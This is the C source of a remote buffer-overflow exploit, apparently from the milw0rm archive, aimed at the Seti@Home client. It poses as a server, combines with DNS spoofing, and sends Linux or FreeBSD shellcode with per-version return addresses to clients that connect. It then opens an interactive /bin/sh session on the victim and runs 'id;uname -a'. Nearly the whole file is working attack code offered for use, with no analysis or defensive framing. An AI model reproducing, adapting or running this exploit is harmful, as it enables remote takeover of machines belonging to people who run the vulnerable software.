/*
   Seti@Home exploit by zillion[at]safemode.org (2003/01/07)

   Credits for the vulnerability go to: SkyLined <SkyLined@edup.tudelft.nl>
   http://spoor12.edup.tudelft.nl/SkyLined%20v4.2/?Advisories/Seti@home

   Use this exploit in combination with a DNS spoofing utility such as the one
   provided in the Dsniff package. http://naughty.monkey.org/~dugsong/dsniff/

*/

#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <stdio.h>

#define NOP 0x41
#define EXEC "TERM=xterm; export TERM=xterm;exec /bin/sh -i"
#define EXEC2 "id;uname -a;"

char linux_shellcode[] =

   /* dup */
   "\x31\xc9\x31\xc0\x31\xdb\xb3\x04\xb0\x3f\xcd\x80\xfe\xc1\xb0"
   "\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80"


   /* execve /bin/sh */
   "\x31\xdb\x31\xc9\xf7\xe3\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
   "\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";


char freebsd_shellcode[] =

  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb1\x03\xbb\xff\xff\xff\xff"
  "\xb2\x04\x43\x53\x52\xb0\x5a\x50\xcd\x80\x80\xe9\x01\x75\xf3"

  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53"
  "\xb0\x3b\x50\xcd\x80";

char static_crap[] =

   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

struct target
{
  int   num;
  char *description;
  char *versions;
  char *type;
  char *shellcode;
  long  retaddress;
  int   bufsize;
  int   offset;
  int   junk;
};

struct target targets[] =
{
  {0,  "Linux  2.2.* ", "3.03.i386      linux-gnu-gnulibc2.1 ", "Packet retr mode", linux_shellcode,
   0xbffff420, 520, 500, 0},
  {1,  "Linux  2.4.* ", "3.03 i386/i686 linux-gnu-gnulibc2.1 ", "Packet retr mode", linux_shellcode,
   0xbffff390, 520, 500, 1},
  {2,  "Linux  2.*   ", "3.03.i386/i686 linux-gnulibc1-static", "Packet retr mode", linux_shellcode,
  0xbffff448, 520, 500, 1},
  {3,  "All above    ", "3.03.i386      linux*               ", "Packet retr mode", linux_shellcode,
   0xbffff448, 520, 300, 1},
  {4,  "FreeBSD      ", "3.03.i386      FreeBSD-2.2.8        ", "Packet retr mode", freebsd_shellcode,
 0x0004956c, 520, 1, 2},
  {5, NULL, NULL, NULL, NULL, 0, 0, 0}
};

int open_socket(int port)
{

  int sock,fd;
  struct sockaddr_in cliAddr, servAddr;

  sock = socket(AF_INET, SOCK_STREAM, 0);
   if(sock<0) {
    printf("Error: Cannot open socket \n");
    exit(1);
  }

  /* bind server port */
  servAddr.sin_family = AF_INET;
  servAddr.sin_addr.s_addr = htonl(INADDR_ANY);
  servAddr.sin_port = htons(port);

  if(bind(sock, (struct sockaddr *) &servAddr, sizeof(servAddr))<0) {
    printf("Error: Cannot bind to port %d \n",port);
    exit(1);
  }

  listen(sock,5);
  fd=accept(sock,0,0);

  return fd;
}

void usage(char *progname) {

  int i;

  printf("\n---------------------------------------------------");
  printf("\n  *- Seti@Home remote exploit by zillion (s-m0de) -*");
  printf("\n---------------------------------------------------");
  printf("\n\nDefault      : %s  -h <target host>",progname);
  printf("\nTarget       : %s  -t <number>",progname);
  printf("\nOffset       : %s  -o <offset>",progname);
  printf("\nPort         : %s  -p <port>\n",progname);
  printf("\nDebug        : %s  -d \n",progname);

  printf("\nAvailable types:\n");
  printf("---------------------------------------------------\n");
  for(i = 0; targets[i].description; i++) {
    fprintf(stdout, "%d\t%s\t%s\t%s\n", targets[i].num, targets[i].description,targets[i].
versions,targets[i].type);
  }
  printf("\n\n");
  exit(0);
}

int sh(int sockfd) {
  char snd[1024], rcv[1024];
  fd_set rset;
  int maxfd, n,test;

  strcpy(snd, EXEC "\n");
  write(sockfd, snd, strlen(snd));

  read(sockfd,rcv,7);
  fflush(stdout);

  strcpy(snd, EXEC2 "\n");
  write(sockfd, snd, strlen(snd));

  /* Main command loop */
  for (;;) {
    FD_SET(fileno(stdin), &rset);
    FD_SET(sockfd, &rset);

    maxfd = ( ( fileno(stdin) > sockfd )?fileno(stdin):sockfd ) + 1;
    select(maxfd, &rset, NULL, NULL, NULL);

    if (FD_ISSET(fileno(stdin), &rset)) {
      bzero(snd, sizeof(snd));
      fgets(snd, sizeof(snd)-2, stdin);
      write(sockfd, snd, strlen(snd));
    }

    if (FD_ISSET(sockfd, &rset)) {
      bzero(rcv, sizeof(rcv));

      if ((n = read(sockfd, rcv, sizeof(rcv))) == 0) {
	/* exit */
	return 0;
      }

      if (n < 0) {
	perror("read");
	return 1;
      }

      fputs(rcv, stdout);
      fflush(stdout);
    }
  } /* for(;;) */
}


int main(int argc, char **argv){

  char *buffer,*tmp;
  long retaddress;
  char rcv[200];
  int fd,i,arg,debug=0,type=0,port=80,offset=250;

  if(argc < 2) { usage(argv[0]); }

  while ((arg = getopt (argc, argv, "dh:o:l:p:t:")) != -1){
    switch (arg){
    case 'd':
	debug = 1;
	break;
    case 'o':
      offset = atoi(optarg);
      break;
    case 'p':
      port = atoi(optarg);
      break;
    case 't':
      type = atoi(optarg);
      break;
    default :
      usage(argv[0]);
    }
  }

  if((targets[type].retaddress) != 0) {
    buffer = (char *)malloc((targets[type].bufsize));

    /* some junk may be required to counter buffer manipulation */

    if(targets[type].junk == 1) {

    tmp = (char *)malloc(strlen(static_crap) + strlen(targets[type].shellcode));

    strcpy(tmp,targets[type].shellcode);
    strcat(tmp,static_crap);

    targets[type].shellcode = tmp;

    }

    memset(buffer,NOP,targets[type].bufsize);
    memcpy(buffer + (targets[type].bufsize) - (strlen(targets[type].shellcode) + 8) ,targets[type].
shellcode,strlen(targets[type].shellcode));

    /* Overwrite EBP and EIP */
    *(long *)&buffer[(targets[type].bufsize) - 8]  = (targets[type].retaddress - targets[type].offset);


    // If freebsd we need to place a value without 00 in ebp

    if(type == 4) {
       *(long *)&buffer[(targets[type].bufsize) - 8]  = 0xbfbff654;
    }

    *(long *)&buffer[(targets[type].bufsize) - 4]  = (targets[type].retaddress - targets[type].offset);

    /* Uncomment to overwrite eip and ebp with 41414141 */
    if(debug == 1) {
    *(long *)&buffer[(targets[type].bufsize) - 8]  = 0x41414141;
    *(long *)&buffer[(targets[type].bufsize) - 4]  = 0x41414141;
    }
  }

  fd = open_socket(port);

  write(fd,buffer,strlen(buffer));
  write(fd,"\n",1);
  write(fd,"\n",1);

  sleep(1);
  sh(fd);

  close(fd);
  return 0;

}


// milw0rm.com [2003-04-08]
